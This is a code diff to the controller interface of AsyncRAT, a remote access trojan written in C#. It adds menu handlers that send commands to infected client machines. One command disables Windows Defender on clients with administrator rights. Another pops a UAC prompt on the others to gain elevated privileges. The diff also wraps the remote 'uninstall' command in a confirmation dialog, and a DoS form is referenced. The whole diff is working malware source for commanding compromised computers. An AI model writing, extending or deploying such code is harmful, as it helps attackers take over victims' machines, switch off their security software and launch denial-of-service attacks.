@@ -42,7 +42,7 @@ namespace AsyncRAT_Sharp
             {
                 if (!File.Exists(Path.Combine(Application.StartupPath, Path.GetFileName(Application.ExecutablePath) + ".config")))
                 {
-                  // File.WriteAllText(Path.Combine(Application.StartupPath, Path.GetFileName(Application.ExecutablePath) + ".config"), Properties.Resources.AsyncRAT_Sharp_exe);
+                    // File.WriteAllText(Path.Combine(Application.StartupPath, Path.GetFileName(Application.ExecutablePath) + ".config"), Properties.Resources.AsyncRAT_Sharp_exe);
                     Process.Start(Application.ExecutablePath);
                     Environment.Exit(0);
                 }
@@ -224,20 +224,24 @@ namespace AsyncRAT_Sharp
         {
             if (listView1.SelectedItems.Count > 0)
             {
-                try
+                DialogResult dialogResult = MessageBox.Show(this, "Are you sure you want to unistall", "AsyncRAT | Unistall", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
+                if (dialogResult == DialogResult.Yes)
                 {
-                    MsgPack msgpack = new MsgPack();
-                    msgpack.ForcePathObject("Packet").AsString = "uninstall";
-                    foreach (ListViewItem itm in listView1.SelectedItems)
+                    try
                     {
-                        Clients client = (Clients)itm.Tag;
-                        ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
+                        MsgPack msgpack = new MsgPack();
+                        msgpack.ForcePathObject("Packet").AsString = "uninstall";
+                        foreach (ListViewItem itm in listView1.SelectedItems)
+                        {
+                            Clients client = (Clients)itm.Tag;
+                            ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
+                        }
                     }
-                }
-                catch (Exception ex)
-                {
-                    MessageBox.Show(ex.Message);
-                    return;
+                    catch (Exception ex)
+                    {
+                        MessageBox.Show(ex.Message);
+                        return;
+                    }
                 }
             }
         }
@@ -644,10 +648,68 @@ namespace AsyncRAT_Sharp
             Properties.Settings.Default.Save();
         }
 
-       private readonly FormDOS formDOS = new FormDOS();
+        private readonly FormDOS formDOS = new FormDOS();
         private void ToolStripMenuItem1_Click(object sender, EventArgs e)
         {
             formDOS.Show();
+        }
+
+        private void WINDOWDSDEFENDERToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (listView1.SelectedItems.Count > 0)
+            {
+                DialogResult dialogResult = MessageBox.Show(this, "Administrator privileges are required!", "AsyncRAT | Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
+                if (dialogResult == DialogResult.Yes)
+                {
+                    try
+                    {
+                        MsgPack msgpack = new MsgPack();
+                        msgpack.ForcePathObject("Packet").AsString = "defender";
+                        foreach (ListViewItem itm in listView1.SelectedItems)
+                        {
+                            if (itm.SubItems[lv_admin.Index].Text == "Administrator")
+                            {
+                                Clients client = (Clients)itm.Tag;
+                                ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
+                            }
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        MessageBox.Show(ex.Message);
+                        return;
+                    }
+                }
+            }
+        }
+
+        private void GETADMINISTRATORPRIVILEGESToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (listView1.SelectedItems.Count > 0)
+            {
+                DialogResult dialogResult = MessageBox.Show(this, "Popup UAC prompt? ", "AsyncRAT | Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
+                if (dialogResult == DialogResult.Yes)
+                {
+                    try
+                    {
+                        MsgPack msgpack = new MsgPack();
+                        msgpack.ForcePathObject("Packet").AsString = "uac";
+                        foreach (ListViewItem itm in listView1.SelectedItems)
+                        {
+                            if (itm.SubItems[lv_admin.Index].Text != "Administrator")
+                            {
+                                Clients client = (Clients)itm.Tag;
+                                ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
+                            }
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        MessageBox.Show(ex.Message);
+                        return;
+                    }
+                }
+            }
         }
     }
 }
